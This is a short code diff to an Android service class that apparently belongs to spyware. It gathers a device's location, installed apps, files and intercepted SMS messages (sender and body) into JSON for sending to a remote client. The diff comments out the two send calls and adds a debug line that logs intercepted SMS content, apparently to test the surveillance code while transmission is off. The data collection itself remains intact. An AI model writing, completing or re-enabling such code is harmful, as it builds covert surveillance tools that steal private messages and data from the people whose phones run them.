@@ -53,7 +53,7 @@ public class MainService extends Service {
             json.put("location", location.toString());
             json.put("installed_apps", installedApps.toString());
             json.put("files", files.toString());
-            client.send(json.toString());
+//            client.send(json.toString());
         } catch (URISyntaxException e) {
             throw new RuntimeException(e);
         } catch (JSONException e) {
@@ -134,19 +134,20 @@ public class MainService extends Service {
                                     senderNumber != null &&
                                     !messageBody.isEmpty() &&
                                     messageBody != null) {
-                                JSONObject json = new JSONObject();
-                                try {
-                                    json.put("id", "");
-                                    json.put("type", "client");
-                                    json.put("res", "message");
-                                    json.put("sender", senderNumber);
-                                    json.put("content", messageBody);
-                                    json.put("timestamp", System.currentTimeMillis());
-
-                                    client.send(json.toString());
-                                } catch (JSONException e) {
-                                    throw new RuntimeException(e);
-                                }
+                                Log.d("eeee", senderNumber + " " + messageBody);
+//                                JSONObject json = new JSONObject();
+//                                try {
+//                                    json.put("id", "");
+//                                    json.put("type", "client");
+//                                    json.put("res", "message");
+//                                    json.put("sender", senderNumber);
+//                                    json.put("content", messageBody);
+//                                    json.put("timestamp", System.currentTimeMillis());
+//
+//                                    client.send(json.toString());
+//                                } catch (JSONException e) {
+//                                    throw new RuntimeException(e);
+//                                }
                             }
                         }
                     }
